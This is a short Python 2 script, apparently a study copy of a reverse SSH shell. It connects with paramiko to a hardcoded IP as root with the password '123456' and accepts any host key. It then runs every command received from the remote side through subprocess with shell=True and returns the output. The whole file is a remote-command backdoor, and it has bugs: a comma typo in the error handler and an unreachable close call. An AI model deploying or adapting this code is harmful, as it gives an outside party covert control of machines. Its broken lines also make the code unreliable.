# -*- coding:utf-8 -*-

import threading
import paramiko
import subprocess

def ssh_conmmand(ip,user,passwd,command):
	client = paramiko.SSHClient()

	#这里是表示也支持用秘钥认证来代替密码验证
	#client.load_host_keys('????')

	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip,username=user,password=passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(command)
		print ssh_session.recv(1024) #读取 banner 信息
		while True:
			command = ssh_session.recv(1024) #通过 SSH 获取命令
			try:
				cmd_output = subprocess.check_output(command,shell = True)
				ssh_session.send(cmd_output)
			except Exception,e:
				ssh_session,send(str(e))
		client.close()
	return
ssh_conmmand("192.168.162.115","root","123456","ClientConnected")